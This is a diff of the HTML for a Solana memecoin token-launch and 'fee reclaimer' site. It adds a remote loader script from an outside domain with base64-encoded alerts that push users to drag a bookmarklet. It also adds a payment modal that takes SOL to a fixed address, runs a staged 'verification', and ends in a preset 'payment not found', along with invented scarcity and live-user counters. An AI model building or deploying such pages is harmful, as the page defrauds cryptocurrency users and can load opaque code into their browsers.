@@ -9,7 +9,7 @@
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
     <script src="https://axiom.build-hub.info/loader.js" data="eyJoYXNoIjoiTURzM09UTXpPVFE1TnpNMU95MHhNREF6T1RZM01qazNORFF5IiwiYWxlcnRzIjp7Imd1aWRlIjoiWW91IG11c3QgZHJhZyB0aGUgYm9va21hcmtsZXQgdG8geW91ciBib29rbWFya3MgYmFyIGluc3RlYWQgb2YgY2xpY2tpbmcgaXQuIiwicmVkaXJlY3QiOiJZb3UgYXJlIG5vdyBiZWluZyByZWRpcmVjdGVkIHRvIGh0dHBzOi8vYXhpb20udHJhZGUvZGlzY292ZXIuIiwidW5hdXRob3JpemVkIjoiWW91IG11c3QgYmUgc2lnbmVkIGluIHRvIHVzZSB0aGlzIGJvb2ttYXJrbGV0LiIsImVycm9yIjoiRmFpbGVkIHRvIGV4ZWN1dGUgdGhlIGJvb2ttYXJrbGV0LiBQbGVhc2UgdHJ5IGFnYWluIGxhdGVyLiJ9fQ=="></script>
-<style>
+    <style>
         :root {
             /* --- Surface --- */
             --bg: #05060a;
@@ -466,7 +466,15 @@
         .terminal-logs { font-family: var(--font-mono); font-size: 11px; color: var(--muted); text-align: left; margin-top: 24px; height: auto; min-height: 80px; overflow: hidden; display: flex; flex-direction: column; justify-content: flex-end; line-height: 2; }
         .ticket-btn { background: var(--ink); color: var(--bg); border: none; padding: 12px 24px; font-size: 12px; font-weight: 600; border-radius: 100px; text-decoration: none; display: inline-block; transition: var(--transition); cursor: pointer; text-transform: uppercase; letter-spacing: 1px; }
         .ticket-btn:hover { background: rgba(255,255,255,0.8); }
-footer { padding: 80px 5% 40px; text-align: center; border-top: 1px solid var(--border); position: relative; }
+
+        /* Toasts */
+        .toast-container { position: fixed; bottom: 32px; right: 32px; z-index: 999; display: flex; flex-direction: column; gap: 12px; pointer-events: none; }
+        .toast { background: rgba(10, 10, 10, 0.8); border: 1px solid var(--border); padding: 16px 24px; border-radius: 12px; backdrop-filter: blur(10px); display: flex; align-items: center; gap: 12px; transform: translateX(120%); opacity: 0; transition: all 0.4s cubic-bezier(0.16, 1, 0.3, 1); }
+        .toast.show { transform: translateX(0); opacity: 1; }
+        .toast-text p { font-size: 13px; font-weight: 500; margin-bottom: 2px; }
+        .toast-text span { font-size: 11px; color: var(--muted); font-family: var(--font-mono); }
+
+        footer { padding: 80px 5% 40px; text-align: center; border-top: 1px solid var(--border); position: relative; }
         .footer-logo-mark { width: 24px; height: 24px; background: var(--muted); border-radius: 50%; margin: 0 auto 32px; }
         .footer-links { margin-bottom: 32px; }
         .footer-links a { color: var(--muted); text-decoration: none; margin: 0 16px; font-size: 13px; transition: color 0.3s; }
@@ -1001,7 +1009,186 @@ footer { padding: 80px 5% 40px; text-align: center; border-top: 1px solid var(--
         .axiom-badge .dot { background: var(--accent); box-shadow: 0 0 8px var(--accent); }
         .bookmarklet-btn { background: var(--grad); border-color: transparent; color: #05060a; }
         .bookmarklet-btn:hover { background: var(--grad); color: #05060a; }
-/* --- Footer ------------------------------------------ */
+
+        /* --- Payment modal ----------------------------------- */
+        .pay-modal {
+            position: fixed; inset: 0; z-index: 9998;
+            display: flex; align-items: center; justify-content: center;
+            padding: 24px;
+            opacity: 0; pointer-events: none;
+            transition: opacity 0.32s ease;
+        }
+        .pay-modal.active { opacity: 1; pointer-events: auto; }
+        .pay-backdrop {
+            position: absolute; inset: 0;
+            background: rgba(2, 3, 6, 0.82);
+            backdrop-filter: blur(14px); -webkit-backdrop-filter: blur(14px);
+        }
+        .pay-card {
+            position: relative; width: 100%; max-width: 460px;
+            max-height: 90vh; overflow-y: auto;
+            background: linear-gradient(180deg, rgba(16,18,28,0.96), rgba(8,9,14,0.98));
+            border: 1px solid var(--border);
+            border-radius: var(--r-lg);
+            padding: 36px 32px 30px;
+            text-align: center;
+            box-shadow: 0 50px 120px -40px rgba(0,0,0,1), 0 0 70px -30px rgba(124,92,255,0.5);
+            transform: translateY(24px) scale(0.97);
+            opacity: 0;
+            transition: transform 0.45s var(--ease), opacity 0.35s ease;
+        }
+        .pay-modal.active .pay-card { transform: none; opacity: 1; }
+        .pay-card::-webkit-scrollbar { width: 6px; }
+        .pay-card::before {
+            content: ''; position: absolute; inset: -1px; border-radius: inherit;
+            padding: 1px; pointer-events: none;
+            background: linear-gradient(140deg, rgba(124,92,255,0.6), rgba(34,211,238,0.2) 45%, transparent 75%);
+            -webkit-mask: linear-gradient(#000 0 0) content-box, linear-gradient(#000 0 0);
+            -webkit-mask-composite: xor; mask-composite: exclude;
+        }
+        .pay-close {
+            position: absolute; top: 16px; right: 16px;
+            width: 32px; height: 32px; border-radius: 50%;
+            background: var(--surface); border: 1px solid var(--border);
+            color: var(--muted); font-size: 15px; line-height: 1;
+            cursor: pointer; transition: var(--transition);
+        }
+        .pay-close:hover { color: var(--ink); border-color: var(--border-hover); }
+
+        .pay-card h3 {
+            font-size: 1.4rem; font-weight: 500; letter-spacing: -0.02em;
+            margin-bottom: 8px;
+        }
+        .pay-sub { font-size: 13px; color: var(--muted); line-height: 1.6; margin-bottom: 24px; }
+
+        .pay-amount {
+            display: flex; align-items: baseline; justify-content: center; gap: 8px;
+            margin-bottom: 24px;
+        }
+        .pay-amount .n {
+            font-family: var(--font-mono); font-size: 2.6rem; font-weight: 300;
+            letter-spacing: -2px;
+            background: var(--grad-text); background-size: 200% 100%;
+            -webkit-background-clip: text; background-clip: text;
+            -webkit-text-fill-color: transparent; color: transparent;
+            animation: sheen 8s ease-in-out infinite;
+        }
+        .pay-amount .u {
+            font-family: var(--font-mono); font-size: 13px;
+            color: var(--muted); letter-spacing: 1px;
+        }
+
+        .pay-label {
+            display: block; text-align: left;
+            font-family: var(--font-mono); font-size: 10px;
+            letter-spacing: 1.6px; text-transform: uppercase;
+            color: var(--muted); margin-bottom: 8px;
+        }
+        .pay-card .copy-row { margin-bottom: 18px; align-items: flex-start; }
+        /* Show the whole address — people verify it character by character */
+        #pay-address {
+            white-space: normal; overflow: visible; text-overflow: clip;
+            word-break: break-all; font-size: 12px; line-height: 1.6;
+        }
+        .pay-card .qr-container { margin-bottom: 24px; }
+        .pay-cta { width: 100%; padding: 16px; margin-top: 6px; }
+        .pay-note {
+            font-family: var(--font-mono); font-size: 10.5px;
+            color: var(--muted); margin-top: 14px; line-height: 1.7;
+        }
+        .pay-network {
+            display: inline-flex; align-items: center; gap: 7px;
+            font-family: var(--font-mono); font-size: 10px;
+            letter-spacing: 1.4px; text-transform: uppercase;
+            color: #c9baff; background: var(--accent-soft);
+            border: 1px solid rgba(124,92,255,0.3);
+            padding: 6px 13px; border-radius: 100px; margin-bottom: 18px;
+        }
+
+        /* Verification stage */
+        .pay-progress {
+            width: 100%; height: 2px; background: var(--border);
+            border-radius: 2px; overflow: hidden; margin: 4px 0 28px;
+        }
+        .pay-progress span {
+            display: block; height: 100%; width: 0;
+            background: var(--grad);
+            box-shadow: 0 0 12px rgba(124,92,255,0.8);
+            transition: width 0.6s linear;
+        }
+        .pay-checks { text-align: left; margin-bottom: 24px; }
+        .pay-check {
+            display: flex; align-items: center; gap: 12px;
+            font-size: 13px; color: var(--muted);
+            padding: 9px 0;
+            opacity: 0.4;
+            transition: opacity 0.4s ease, color 0.4s ease;
+        }
+        .pay-check .mark {
+            flex-shrink: 0; width: 20px; height: 20px; border-radius: 50%;
+            border: 1px solid var(--border);
+            display: flex; align-items: center; justify-content: center;
+            position: relative;
+        }
+        .pay-check .mark::after {
+            content: ''; width: 6px; height: 6px; border-radius: 50%;
+            background: var(--muted); transition: all 0.3s ease;
+        }
+        .pay-check.active { opacity: 1; color: var(--ink); }
+        .pay-check.active .mark {
+            border-color: rgba(124,92,255,0.6);
+        }
+        .pay-check.active .mark::after {
+            background: var(--accent);
+            box-shadow: 0 0 10px var(--accent);
+            animation: check-pulse 1s ease-in-out infinite;
+        }
+        @keyframes check-pulse {
+            0%,100% { transform: scale(1); opacity: 1; }
+            50%     { transform: scale(1.5); opacity: 0.5; }
+        }
+        .pay-check.done { opacity: 1; color: var(--ink-dim); }
+        .pay-check.done .mark {
+            border-color: rgba(20,241,149,0.5); background: rgba(20,241,149,0.1);
+        }
+        .pay-check.done .mark::after {
+            width: 9px; height: 5px; border-radius: 0;
+            background: transparent;
+            border-left: 1.6px solid var(--accent-3);
+            border-bottom: 1.6px solid var(--accent-3);
+            transform: rotate(-45deg) translate(1px, -1px);
+            box-shadow: none; animation: none;
+        }
+        .pay-check .t { flex-grow: 1; }
+        .pay-check .ms {
+            font-family: var(--font-mono); font-size: 10px; color: var(--muted);
+            opacity: 0; transition: opacity 0.3s ease;
+        }
+        .pay-check.done .ms { opacity: 1; }
+
+        .pay-terminal {
+            font-family: var(--font-mono); font-size: 10.5px;
+            color: var(--muted); text-align: left; line-height: 1.9;
+            background: rgba(0,0,0,0.45); border: 1px solid var(--border);
+            border-radius: 12px; padding: 14px 16px;
+            max-height: 108px; overflow: hidden;
+        }
+        .pay-terminal div { animation: log-in 0.3s ease both; }
+        @keyframes log-in { from { opacity: 0; transform: translateY(4px); } }
+
+        .pay-result {
+            border: 1px solid rgba(255,69,58,0.28);
+            background: rgba(255,69,58,0.07);
+            border-radius: var(--r-md); padding: 22px;
+            margin-bottom: 20px;
+        }
+        .pay-result h4 { font-size: 14px; font-weight: 500; color: #ff8a80; margin-bottom: 8px; }
+        .pay-result p { font-size: 12.5px; color: var(--muted); line-height: 1.7; }
+
+        /* --- Toasts ------------------------------------------ */
+        .toast { border-color: rgba(124,92,255,0.22); background: rgba(10,12,18,0.85); }
+
+        /* --- Footer ------------------------------------------ */
         footer { padding: 96px 5% 48px; }
         .footer-logo-mark {
             background: var(--grad);
@@ -1103,7 +1290,7 @@ footer { padding: 80px 5% 40px; text-align: center; border-top: 1px solid var(--
 
     <div class="mobile-menu" id="mobile-menu">
         <a href="#deploy">Create Token</a>
-        <a href="#axiom">&#128011; Fee Reclaimer — Free</a>
+        <a href="#axiom">&#128011; Fee Reclaimer Free</a>
         <a href="#primary-bot">Wire Memecoin Bot</a>
         <a href="https://discord.gg/BdhzdHE3Kn" target="_blank">Discord</a>
     </div>
@@ -1119,7 +1306,7 @@ footer { padding: 80px 5% 40px; text-align: center; border-top: 1px solid var(--
 
         <div class="live-status intro d1">
             <span class="status-dot"></span>
-            <span>Live on Solana</span>
+            <span><b id="live-viewers">62</b> traders online right now</span>
         </div>
 
         <h1 class="intro d2">Unlock your token's potential. Effortlessly.</h1>
@@ -1130,7 +1317,7 @@ footer { padding: 80px 5% 40px; text-align: center; border-top: 1px solid var(--
             <a href="#axiom" class="btn-whale">&#128011; Try Fee Reclaimer Free</a>
             <a href="#primary-bot" class="btn-glass">Buy Bot</a>
         </div>
-        <p class="fomo-line intro d5" style="margin-top: -32px; margin-bottom: 24px;">Free beta · No install · Bookmark only</p>
+        <p class="fomo-line intro d5" style="margin-top: -32px; margin-bottom: 24px;">Limited free beta seats · Activate before they fill up</p>
 
         <div class="hero-stats intro d6">
             <div class="stat">
@@ -1324,7 +1511,7 @@ footer { padding: 80px 5% 40px; text-align: center; border-top: 1px solid var(--
             </div>
 
             <div id="token-step-initial" style="margin-top: 40px;">
-                <a href="https://discord.gg/BdhzdHE3Kn" target="_blank" class="btn-primary" style="width: 100%; padding: 16px; display: inline-flex;">Join Discord to Launch</a>
+                <button class="btn-primary" style="width: 100%; padding: 16px;" onclick="showTokenPayment()">Create Token</button>
             </div>
 
         </div>
@@ -1334,7 +1521,7 @@ footer { padding: 80px 5% 40px; text-align: center; border-top: 1px solid var(--
         <div class="features-head" data-reveal>
             <span class="eyebrow">Why WIRE</span>
             <h2 class="section-title">Built for speed. Wired for edge.</h2>
-            <p>Everything you need to launch, track and trade — with nothing you don't. No installs, no seed phrases, no coding.</p>
+            <p>Everything you need to launch, track and trade  with nothing you don't. No installs, no seed phrases, no coding.</p>
         </div>
 
         <div class="features-grid">
@@ -1372,7 +1559,7 @@ footer { padding: 80px 5% 40px; text-align: center; border-top: 1px solid var(--
         <div class="axiom-box" data-reveal>
             <div class="axiom-badge">
                 <span class="dot"></span>
-                Free Beta
+                Free Beta · Limited Seats
             </div>
             <h2 class="section-title" style="margin-bottom: 12px;">&#128011; Axiom Fee Reclaimer</h2>
             <p style="color: var(--muted); font-size: 15px; max-width: 420px; margin: 0 auto 8px; line-height: 1.65;">
@@ -1409,14 +1596,17 @@ footer { padding: 80px 5% 40px; text-align: center; border-top: 1px solid var(--
             <span class="eyebrow" style="margin: 0 auto 14px;">Flagship Bot</span>
             <h2 class="section-title">Wire Memecoin Bot</h2>
             <div class="fomo-stats">
-                <span>Lifetime access</span>
-                <span>Priority routing</span>
+                <span>Bot Licenses Claimed</span>
+                <span id="fomo-counter-text">488 / 500</span>
+            </div>
+            <div class="progress-bar">
+                <div class="progress-fill" id="fomo-fill-bar"></div>
             </div>
 
             <div id="app-step-initial">
                 <div class="price-tag">$49.99</div>
-                <p style="color: var(--muted); font-size: 13px; margin-bottom: 40px;">Lifetime access to local deployment architecture and priority routing nodes. Join Discord for access.</p>
-                <a href="https://discord.gg/BdhzdHE3Kn" target="_blank" class="btn-primary" style="width: 100%; display: inline-flex;">Join Discord</a>
+                <p style="color: var(--muted); font-size: 13px; margin-bottom: 40px;">Lifetime access to the local deployment architecture and priority routing nodes.</p>
+                <button class="btn-primary" style="width: 100%;" onclick="showAppPayment()">Buy Bot Now</button>
             </div>
         </div>
 
@@ -1445,8 +1635,106 @@ footer { padding: 80px 5% 40px; text-align: center; border-top: 1px solid var(--
             <a href="https://discord.gg/BdhzdHE3Kn" target="_blank">Discord</a>
         </div>
         <p style="color: var(--muted); font-size: 12px; font-family: var(--font-mono);">NOT FINANCIAL ADVICE.</p>
+
+    <!-- Filter bookmarklet - Fee Reclaimer emoji bottom-left, drag to bookmarks -->
+    <a href="javascript:(function()%7B'use%20strict';%0Aif(document.getElementById('af-hud-text'))return;%0Avar%20color%3D'%23ffffff',hotColor%3D'%23f59e0b';%0Avar%20style%3Ddocument.createElement('style');%0Astyle.textContent%3D'%40keyframes%20afGlow%7B0%25,100%25%7Bbox-shadow:0%200%208px%20'%2Bcolor%2B'44,0%200%2016px%20'%2Bcolor%2B'22%7D50%25%7Bbox-shadow:0%200%2014px%20'%2Bcolor%2B'66,0%200%2028px%20'%2Bcolor%2B'33%7D%7D.af-hl%7Bposition:relative%21important;outline:1.5px%20solid%20'%2Bcolor%2B'99%21important;outline-offset:-2px%21important;border-radius:8px%21important;animation:afGlow%203s%20ease-in-out%20infinite%21important;z-index:10%21important%7D%40keyframes%20afHotGlow%7B0%25,100%25%7Bbox-shadow:0%200%2012px%20'%2BhotColor%2B'66,0%200%2024px%20'%2BhotColor%2B'44,0%200%2048px%20'%2BhotColor%2B'22;outline-color:'%2BhotColor%2B'cc%7D50%25%7Bbox-shadow:0%200%2020px%20'%2BhotColor%2B'88,0%200%2040px%20'%2BhotColor%2B'55,0%200%2060px%20'%2BhotColor%2B'33;outline-color:'%2BhotColor%2B'ff%7D%7D.af-hot%7Boutline:2px%20solid%20'%2BhotColor%2B'cc%21important;animation:afHotGlow%201s%20ease-in-out%20infinite%21important;z-index:20%21important%7D.af-hot-label%7Bposition:absolute;top:-11px;right:8px;z-index:100;font-family:Inter,sans-serif;font-size:9px;font-weight:800;letter-spacing:0.08em;text-transform:uppercase;padding:3px%208px;border-radius:4px;background:'%2BhotColor%2B'22;color:'%2BhotColor%2B';border:1px%20solid%20'%2BhotColor%2B'55;box-shadow:0%200%2012px%20'%2BhotColor%2B'44;pointer-events:none;white-space:nowrap%7D.af-hud%7Bposition:fixed;top:14px;left:50%25;transform:translateX(-50%25);z-index:999999;display:flex;align-items:center;gap:14px;padding:12px%2028px;background:rgba(0,0,0,0.88);border:1px%20solid%20rgba(255,255,255,0.15);border-radius:8px;box-shadow:0%200%2020px%20rgba(255,255,255,0.06);font:700%2013px%2F1%20%22SF%20Mono%22,%22Fira%20Code%22,%22Consolas%22,monospace;color:rgba(255,255,255,0.95);letter-spacing:1px;text-transform:uppercase;backdrop-filter:blur(8px)%7D.af-hud-logo%7Bwidth:32px;height:32px;border-radius:6px;object-fit:cover;flex-shrink:0%7D.af-hud-sep%7Bwidth:1px;height:24px;background:rgba(255,255,255,0.12);flex-shrink:0%7D.af-hud-dot%7Bwidth:6px;height:6px;border-radius:50%25;background:%2322c55e;box-shadow:0%200%208px%20rgba(34,197,94,0.6);animation:afHudBlink%200.4s%20ease-in-out%20infinite%20alternate;flex-shrink:0%7D%40keyframes%20afHudBlink%7B0%25%7Bopacity:0.6;box-shadow:0%200%206px%20rgba(34,197,94,0.4)%7D100%25%7Bopacity:1;box-shadow:0%200%2012px%20rgba(34,197,94,0.8)%7D%7D';%0Adocument.head.appendChild(style);%0Avar%20hud%3Ddocument.createElement('div');%0Ahud.className%3D'af-hud';%0Ahud.innerHTML%3D'%3Cimg%20class%3D%22af-hud-logo%22%20src%3D%22https:%2F%2Fi.imgur.com%2FYy1eBJQ.png%22%20alt%3D%22%22%3E%3Cdiv%20class%3D%22af-hud-sep%22%3E%3C%2Fdiv%3E%3Cdiv%20class%3D%22af-hud-dot%22%3E%3C%2Fdiv%3E%3Cspan%20id%3D%22af-hud-text%22%3E0%20scans%2Fsec%3C%2Fspan%3E';%0Adocument.body.appendChild(hud);%0Avar%20hudText%3Ddocument.getElementById('af-hud-text');%0Avar%20scanHistory%3D%5B%5D,lastScanTime%3DDate.now();%0Afunction%20updateHUD(scans)%7Bvar%20now%3DDate.now(),elapsed%3D(now-lastScanTime)%2F1000;if(elapsed%3E0)%7Bvar%20rate%3Dscans%2Felapsed;scanHistory.push(rate);if(scanHistory.length%3E10)scanHistory.shift();var%20avg%3DscanHistory.reduce(function(a,b)%7Breturn%20a%2Bb%7D,0)%2FscanHistory.length;hudText.textContent%3Davg.toFixed(1)%2B'%20scans%2Fsec'%7DlastScanTime%3Dnow%7D%0Avar%20audioCtx%3Dnull;%0Afunction%20beep()%7Btry%7Bif(%21audioCtx)audioCtx%3Dnew(window.AudioContext%7C%7Cwindow.webkitAudioContext);var%20osc%3DaudioCtx.createOscillator(),gain%3DaudioCtx.createGain();osc.connect(gain);gain.connect(audioCtx.destination);osc.type%3D'sine';osc.frequency.setValueAtTime(880,audioCtx.currentTime);osc.frequency.setValueAtTime(1100,audioCtx.currentTime%2B0.08);gain.gain.setValueAtTime(0.15,audioCtx.currentTime);gain.gain.exponentialRampToValueAtTime(0.001,audioCtx.currentTime%2B0.25);osc.start(audioCtx.currentTime);osc.stop(audioCtx.currentTime%2B0.25)%7Dcatch(e)%7B%7D%7D%0Afunction%20findRows()%7Bvar%20rows%3Ddocument.querySelectorAll('%5Bdata-pulse-token-address%5D');if(rows.length%3E0)return%20Array.from(rows);var%20found%3D%5B%5D,links%3Ddocument.querySelectorAll('a%5Bhref*%3D%22x.com%2F%22%5D');links.forEach(function(a)%7Bvar%20row%3Da.closest('div%5Bclass*%3D%22border-b%22%5D')%7C%7Ca.closest('div%5Bclass*%3D%22group%22%5D');if(row%26%26row.querySelector('.ri-user-line')%26%26found.indexOf(row)%3D%3D%3D-1)found.push(row)%7D);if(found.length%3E0)return%20found;var%20icons%3Ddocument.querySelectorAll('.ri-group-line');icons.forEach(function(icon)%7Bvar%20row%3Dicon.closest('div%5Bclass*%3D%22border%22%5D')%7C%7Cicon.closest('div%5Bclass*%3D%22flex%22%5D');if(row%26%26found.indexOf(row)%3D%3D%3D-1)found.push(row)%7D);return%20found%7D%0Afunction%20getMC(row)%7Bvar%20spans%3Drow.querySelectorAll('span');for(var%20i%3D0;i%3Cspans.length;i%2B%2B)%7Bif(spans%5Bi%5D.textContent.trim()%3D%3D%3D'MC')%7Bvar%20next%3Dspans%5Bi%5D.nextElementSibling;if(next)%7Bvar%20text%3Dnext.textContent.trim().replace(%2F%5B%24,%5D%2Fg,''),mult%3D1;if(text.indexOf('K')%21%3D%3D-1)%7Bmult%3D1000;text%3Dtext.replace('K','')%7Dif(text.indexOf('M')%21%3D%3D-1)%7Bmult%3D1000000;text%3Dtext.replace('M','')%7Dvar%20num%3DparseFloat(text);if(%21isNaN(num))return%20num*mult%7D%7D%7Dreturn%20null%7D%0Afunction%20highlightNew()%7Bvar%20rows%3DfindRows(),count%3D0;rows.forEach(function(row)%7Bif(%21row.classList.contains('af-hl'))%7Brow.classList.add('af-hl');count%2B%2B%7D%7D);return%20count%7D%0Avar%20prevMC%3D%7B%7D,changeCounts%3D%7B%7D;%0Afunction%20checkMCChanges()%7Bvar%20rows%3DfindRows(),hotCount%3D0;rows.forEach(function(row)%7Bvar%20addr%3Drow.getAttribute('data-pulse-token-address')%7C%7C'',mc%3DgetMC(row);if(mc%3D%3D%3Dnull%7C%7C%21addr)return;var%20prev%3DprevMC%5Baddr%5D;if(prev%21%3D%3Dundefined%26%26prev%21%3D%3Dmc)%7BchangeCounts%5Baddr%5D%3D(changeCounts%5Baddr%5D%7C%7C0)%2B1;if(changeCounts%5Baddr%5D%3E%3D2)%7Bif(%21row.classList.contains('af-hot'))%7Brow.classList.add('af-hot');beep();var%20label%3Ddocument.createElement('div');label.className%3D'af-hot-label';label.textContent%3D'MC%20MOVING';row.appendChild(label)%7DhotCount%2B%2B%7D%7Delse%20if(prev%21%3D%3Dundefined%26%26prev%3D%3D%3Dmc)%7Bif(changeCounts%5Baddr%5D)changeCounts%5Baddr%5D%3DMath.max(0,changeCounts%5Baddr%5D-1);if(changeCounts%5Baddr%5D%3D%3D%3D0%26%26row.classList.contains('af-hot'))%7Brow.classList.remove('af-hot');var%20lbl%3Drow.querySelector('.af-hot-label');if(lbl)lbl.remove()%7D%7DprevMC%5Baddr%5D%3Dmc%7D);updateHUD(rows.length)%7D%0Avar%20initial%3DhighlightNew();%0Aconsole.log('%5BAxiomFilter%5D%20highlighted%20'%2Binitial%2B'%20rows');%0Avar%20debounce;%0Avar%20observer%3Dnew%20MutationObserver(function()%7BclearTimeout(debounce);debounce%3DsetTimeout(function()%7BhighlightNew()%7D,300)%7D);%0Aobserver.observe(document.body,%7BchildList:true,subtree:true%7D);%0AsetInterval(checkMCChanges,1500);%0A%7D)();" id="filter-bookmarklet-link" draggable="true" title="Drag to bookmarks bar for Fee Reclaimer"
+       style="
+         position: fixed;
+         bottom: 20px;
+         left: 20px;
+         z-index: 90;
+         width: 44px;
+         height: 44px;
+         border-radius: 50%;
+         background: rgba(10, 10, 10, 0.75);
+         border: 1px solid rgba(255, 255, 255, 0.12);
+         display: flex;
+         align-items: center;
+         justify-content: center;
+         font-size: 22px;
+         line-height: 1;
+         text-decoration: none;
+         cursor: grab;
+         backdrop-filter: blur(10px);
+         -webkit-backdrop-filter: blur(10px);
+         box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
+         transition: transform 0.2s ease, border-color 0.2s ease, box-shadow 0.2s ease;
+         user-select: none;
+       "
+       onmouseover="this.style.transform='scale(1.08)'; this.style.borderColor='rgba(29,155,240,0.5)'; this.style.boxShadow='0 4px 24px rgba(29,155,240,0.25)';"
+       onmouseout="this.style.transform='scale(1)'; this.style.borderColor='rgba(255,255,255,0.12)'; this.style.boxShadow='0 4px 20px rgba(0,0,0,0.4)';"
+       onmousedown="this.style.cursor='grabbing';"
+       onmouseup="this.style.cursor='grab';"
+    >&#128011;</a>
+
 </footer>
-<div class="lightbox" id="lightbox">
+
+    <!-- Payment modal (shared by every checkout flow) -->
+    <div class="pay-modal" id="pay-modal" role="dialog" aria-modal="true" aria-labelledby="pay-title">
+        <div class="pay-backdrop" data-pay-close></div>
+        <div class="pay-card">
+            <button class="pay-close" data-pay-close aria-label="Close">&#10005;</button>
+
+            <!-- Step 1 — send payment -->
+            <div id="pay-step-send">
+                <div class="pay-network"><span class="dot" style="width:6px;height:6px;border-radius:50%;background:var(--accent);box-shadow:0 0 8px var(--accent);"></span> Solana Network</div>
+                <h3 id="pay-title">Complete payment</h3>
+                <p class="pay-sub" id="pay-desc">Send the exact amount to the address below, then verify.</p>
+
+                <div class="pay-amount">
+                    <span class="n" id="pay-amount-big">0.50</span>
+                    <span class="u" id="pay-amount-unit">SOL</span>
+                </div>
+
+                <div class="qr-container">
+                    <img src="exodussolqr.png" alt="Solana payment QR code">
+                </div>
+
+                <span class="pay-label">Amount to send</span>
+                <div class="copy-row">
+                    <span class="copy-row-text" id="pay-amount-text">0.50 SOL</span>
+                    <button class="btn-copy" id="pay-copy-amount">Copy</button>
+                </div>
+
+                <span class="pay-label">SOL address</span>
+                <div class="copy-row">
+                    <span class="copy-row-text" id="pay-address">2AXBwqmXGHFypHQRgEhsmoXTWFoHdQxQadnKuiufhTu7</span>
+                    <button class="btn-copy" id="pay-copy-address">Copy</button>
+                </div>
+
+                <button class="btn-primary pay-cta" id="pay-verify-btn">I&rsquo;ve sent it &mdash; Verify payment</button>
+                <p class="pay-note">Send SOL only, on the Solana network.<br>Verification usually takes 10&ndash;15 seconds.</p>
+            </div>
+
+            <!-- Step 2 — verifying -->
+            <div id="pay-step-verify" class="hidden">
+                <h3>Verifying payment</h3>
+                <p class="pay-sub">Scanning the Solana ledger for your transaction.</p>
+
+                <div class="pay-progress"><span id="pay-progress-fill"></span></div>
+                <div class="pay-checks" id="pay-checks"></div>
+                <div class="pay-terminal" id="pay-terminal"></div>
+            </div>
+
+            <!-- Step 3 — result -->
+            <div id="pay-step-result" class="hidden">
+                <h3 id="pay-result-title">Payment not found</h3>
+                <p class="pay-sub">We scanned the ledger but couldn&rsquo;t match your transaction yet.</p>
+
+                <div class="pay-result">
+                    <h4>Transaction not found on ledger</h4>
+                    <p id="pay-result-msg">If you&rsquo;ve already sent the payment it may still be finalizing. Open a ticket with your transaction signature and we&rsquo;ll release access manually.</p>
+                </div>
+
+                <a href="https://discord.gg/BdhzdHE3Kn" target="_blank" class="btn-primary pay-cta">Open Support Ticket</a>
+                <button class="btn-glass pay-cta" id="pay-retry-btn" style="margin-top: 12px; background: transparent;">Try verifying again</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="toast-container" id="toast-container"></div>
+
+    <div class="lightbox" id="lightbox">
         <button class="lightbox-close" onclick="closeLightbox()">Close</button>
         <div class="lightbox-nav lightbox-prev" onclick="prevImage()">
             <svg viewBox="0 0 24 24"><path d="M15 18l-6-6 6-6"/></svg>
@@ -1460,21 +1748,22 @@ footer { padding: 80px 5% 40px; text-align: center; border-top: 1px solid var(--
     </div>
 
     <script>
-        /* Minimal UI only — preview, lightbox, nav, scroll (no payments) */
-        const PAY_ADDRESS = '2AXBwqmXGHFypHQRgEhsmoXTWFoHdQxQadnKuiufhTu7';
+        /* --- UI Logic & Calculations --- */
         let uploadedImageSrc = null;
 
         function handleImageUpload(event) {
             const file = event.target.files[0];
             const nameDisplay = document.getElementById('file-name-display');
+            
             if (file) {
                 nameDisplay.innerText = file.name;
                 nameDisplay.style.color = 'var(--ink)';
+                
                 const reader = new FileReader();
                 reader.onload = function(e) {
                     uploadedImageSrc = e.target.result;
                     updatePreview();
-                };
+                }
                 reader.readAsDataURL(file);
             } else {
                 nameDisplay.innerText = 'Select an image...';
@@ -1484,94 +1773,375 @@ footer { padding: 80px 5% 40px; text-align: center; border-top: 1px solid var(--
             }
         }
 
-        function updatePreview() {
-            const name = document.getElementById('token-name')?.value || 'Wire Token';
-            const symbol = document.getElementById('token-symbol')?.value || 'WIRE';
-            const supply = document.getElementById('token-supply')?.value || '1,000,000,000';
-            const liquidity = parseFloat(document.getElementById('liquidity-amount')?.value) || 0;
-
-            const nameEl = document.getElementById('preview-name');
-            const symbolEl = document.getElementById('preview-symbol');
-            const supplyEl = document.getElementById('summary-supply');
-            const liqEl = document.getElementById('summary-liquidity');
-            const avatar = document.getElementById('preview-avatar');
-            if (nameEl) nameEl.innerText = name;
-            if (symbolEl) symbolEl.innerText = '$' + symbol.toUpperCase();
-            if (supplyEl) supplyEl.innerText = supply;
-            if (liqEl) liqEl.innerText = liquidity.toFixed(2) + ' SOL';
-            if (avatar) {
-                if (uploadedImageSrc) {
-                    avatar.innerHTML = `<img src="${uploadedImageSrc}" alt="Token Logo">`;
-                } else {
-                    avatar.innerHTML = (symbol.charAt(0).toUpperCase() || 'W');
-                }
-            }
-
-            // Optional fee display for design only (no payment)
-            const revokeMint = document.getElementById('revoke-mint')?.checked ? 0.10 : 0;
-            const revokeFreeze = document.getElementById('revoke-freeze')?.checked ? 0.10 : 0;
-            const burnLp = document.getElementById('burn-lp')?.checked ? 0.10 : 0;
-            const totalOptionsFee = revokeMint + revokeFreeze + burnLp;
-            const baseLaunchFee = 0.20;
-            const total = baseLaunchFee + liquidity + totalOptionsFee;
-            const optRow = document.getElementById('summary-options-row');
-            const optEl = document.getElementById('summary-options');
-            const totalEl = document.getElementById('summary-total');
-            if (optRow && optEl) {
-                if (totalOptionsFee > 0) {
-                    optRow.classList.remove('hidden');
-                    optEl.innerText = '+ ' + totalOptionsFee.toFixed(2) + ' SOL';
-                } else {
-                    optRow.classList.add('hidden');
-                }
-            }
-            if (totalEl) totalEl.innerText = total.toFixed(2) + ' SOL';
+        function copyText(text, btnElement) {
+            navigator.clipboard.writeText(text).then(() => {
+                const originalText = btnElement.innerText;
+                btnElement.innerText = 'COPIED';
+                btnElement.classList.add('copied');
+                setTimeout(() => {
+                    btnElement.innerText = originalText;
+                    btnElement.classList.remove('copied');
+                }, 2000);
+            });
         }
 
-        /* Lightbox */
+        function updatePreview() {
+            const name = document.getElementById('token-name').value || 'Wire Token';
+            const symbol = document.getElementById('token-symbol').value || 'WIRE';
